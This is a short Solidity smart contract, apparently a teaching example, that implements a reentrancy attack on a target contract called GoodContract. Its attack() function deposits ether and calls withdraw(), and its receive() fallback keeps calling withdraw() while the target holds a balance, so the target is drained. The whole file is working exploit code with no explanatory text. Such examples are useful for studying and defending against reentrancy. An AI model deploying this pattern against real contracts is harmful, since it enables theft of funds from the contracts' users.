// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "./IGoodContract.sol";

contract BadContract {
    IGoodContract public GoodContract;

    constructor(address _goodContractAddress) {
        GoodContract = IGoodContract(_goodContractAddress);
    }

    receive() external payable {
        if (address(GoodContract).balance > 0) {
            GoodContract.withdraw();
        }
    }

    function attack() public payable {
        GoodContract.addBalance{value: msg.value}();
        GoodContract.withdraw();
    }
}
